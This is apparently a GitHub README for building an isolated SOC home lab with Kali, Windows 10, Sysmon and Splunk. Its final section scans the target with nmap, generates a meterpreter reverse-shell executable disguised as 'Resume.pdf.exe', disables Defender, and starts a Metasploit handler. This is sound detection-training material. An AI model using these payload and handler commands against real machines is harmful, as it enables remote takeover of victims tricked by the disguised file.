# SOC-Home-Lab-Setup
This project is based on setting up a functional and isolated SOC home lab environment for cybersecurity learning and threat detection practice. This lab simulates attacker and defender roles using tools like Kali Linux (attacker), Windows + Sysmon (endpoint monitoring), and Splunk (log analysis and SIEM). Here we are analysing malware by deploying malware through Kali and attacking our target Windows, and then analysing the telemetry generated on Splunk.

## Requirements:
- Oracle VirtualBox – A Virtualization platform to host multiple virtual machines.

- Kali Linux – Attacker machine for penetration testing and threat simulation.

- Windows 10 VM – Target machine to simulate user activity and attacks.

- Sysmon (System Monitor) – Windows system monitoring tool to log key events.

- Splunk Free – Log analysis and SIEM tool for ingesting and analyzing Sysmon logs.

## Steps:
### Step 1: Install VirtualBox
- Download from https://www.virtualbox.org

- Install on your host OS (Windows/Linux/macOS)

Here we are using Windows OS as our host machine.

### Step 2: Download the ISO images and tools.

#### Windows 10 VM:

- Install Windows 10 ISO (https://www.microsoft.com/en-ca/software-download/windows10)
- Click on Create Windows 10 installation media and download the ISO image.
- Enable the network adapter in NAT/Host-only mode for isolation

#### Kali Linux VM:

- Download ISO from https://www.kali.org
- To unzip the Kali Linux file, download 7-Zip (https://7-zip.org).
- Basic setup with networking enabled

#### 
  
#### Install Splunk Enterprise(Free Edition)

- Install on the Windows VM.

### Step 3: Creating Virtual Machines
#### For Windows
- Open Oracle VM and click on *New*, and select the folder you want to store the file.
- Name the machine as demo and select the ISO image downloaded.
- For Hardware, set the base memory up to 4 GB and 1 CPU, click *Next*.
- For Virtual Hard disk set to 50 GB, click *Finish*
- To power on the Windows machine, click *Start* and install Windows 10.
#### For Kali Linux
- After extracting the files to the desired folder, click on the  Kali Linux Vbox extension file.
- The machine will be automatically imported into our virtual box.
- To log in to the Kali machine, enter the default credentials *"username=kali,password=kali"*

### Step 4: Install Sysmon on Windows 10 VM
- Once the test machine is running, open a web browser and go to https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- Download Sysmon from Microsoft Sysinternals and extract it to a folder.
- Download the configuration file from https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml
- Open the PowerShell, run as an administrator.
- To be in the same folder, copy the folder path and paste it into PowerShell.
- Install using the below command

        .\Sysmon64.exe -i .\sysmonconfig.xml
  
### Step 5: Install Splunk Enterprise on Windows 10 VM
- Download Splunk Enterprise Free Edition from https://splunk.com
- Click on the downloaded file and select the local system, and click Next.
- Create your username and password and click Install.
- Now Splunk will be installed on your local host on port 8000.

 #### To add data to Splunk
 - Log in with your username and password.
 - Select *Add Data-> Monitoring(to monitor event logs)-> Local Event Logs*.
 - Select *Application, Security, and System* for Event logs, click *Next*.
 - Input Setting->*default*, and click Submit.

### Step 6: Network Configuration
Here we are analyzing malware in our virtual machine, so to reduce the risk of infecting our host and virtual machine, configuring our network to isolate the virtual machine from the host is crucial. 
The network setting we are using here is the *Internal Network*, where the VMs are in their own network, where an IP address for each VM is assigned statically. These VMs will not have access to the internet or your LAN.

- Open VirtualBox -> select Windows 10 -> Settings -> Network -> Internal Network -> Name your network *mytest* ->ok.
- Same goes for Kali Linux.
Now the two machines are in the same network. But we have to statically assign an IP address to both machines.

#### Static IP for Windows:
- Power up the Windows
- Open Network and Internet Settings -> Change adapter settings -> Ethernet
- Right click on Ethernet -> Properties -> TCP/IPv4
- Select Use the following IP addresses
- IP Address: 192.168.20.10 , Subnet Mask: 255.255.255.0
- Default DNS and Gateway, click OK.

To check the settings, open the command prompt-> ipconfig, and you should see your new IP address.

#### Static IP for Kali Linux:
- Power up the Kali
- Right-click on Ethernet -> Edit Connections -> Wired connection -> Settings
- Select IPv4 Settings -> Method select Manual
- Addresses -> Add -> 192.168.20.11, Netmask ->24 -> Save

Open a terminal, run ifconfig, and check the IP address.

## Network Scanning with Nmap, Malware Analysis, and analysis of generated telemetry on Windows machine
Here we are using Nmap in Kali to scan the open ports available on Windows, and creating and analysing our own malware to observe the telemetry it generates on Windows machine.
Before deploying the malware, disable Windows Defender to establish reverse TCP connection.

#### On Kali Linux Demo
- Open terminal, enter *nmap -h*, which shows available options for nmap
- To scan Windows, enter *nmap 192.168.20.10 -Pn* to identify open ports
- Here, RDP port 3389 is open on Windows
- Now we can create malware on Kali to perform an attack on the target Windows system

##### Creation of basic malware 
- Use msfvenom to create a malware and a meterpreter reverse shell as a payload
- On Kali -> terminal -> enter msfvenom
- terminal -> msfvenom -l payloads, which gives a list of payloads
- Here we are using *windows/x64/meterpreter_reverese_tcp*
- In the terminal, enter
  
           msfvenom -p windows/x64/meterpreter_reverse_tcp lhost-192.168.20.11 lport-4444 -f exe -o Resume.pdf.exe
 Here we are specifying Meterpreter to connect back to the host through reverse TCP by mentioning the host IP and Port, and specifying the file format, i.e., exe and file output Resume.pdf.exe

 - Now the Resume.pdf.exe file is created.

To listen to the port we have configured, in our malware, we need a handler, so open *Metasploit*.
- terminal -> msfconsole
- msf -> use exploit/multi/handler
- Change the payload from a generic to a configured payload.
- enter *set payload windows/x64/meterpreter/reverse_tcp*
- Type options to see the changed payload

Now, change the lhost to Kali
- Enter *set lhost 192.168.20.11*
- 
Now we can start the handler
- Enter *exploit*
and listen in, and wait for the test machine to download and execute our malware. 












